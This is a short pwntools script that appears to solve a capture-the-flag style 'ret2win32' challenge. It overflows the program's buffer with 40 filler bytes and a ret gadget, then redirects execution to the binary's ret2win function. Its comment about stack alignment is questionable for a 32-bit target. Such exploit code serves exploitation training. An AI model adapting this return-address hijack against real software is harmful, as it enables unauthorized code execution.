from pwn import *
import re

exe = ELF("./ret2win32", checksec=False)
p = process('./ret2win32')

rop = ROP(exe)
ret = rop.find_gadget(["ret"])[0]

payload  = b'A' * 40
payload += p32(ret)                  # fix stack alignment
payload += p32(exe.symbols['ret2win'])

p.sendlineafter('> ', payload)

output = p.recvall().decode(errors="ignore")
print(output)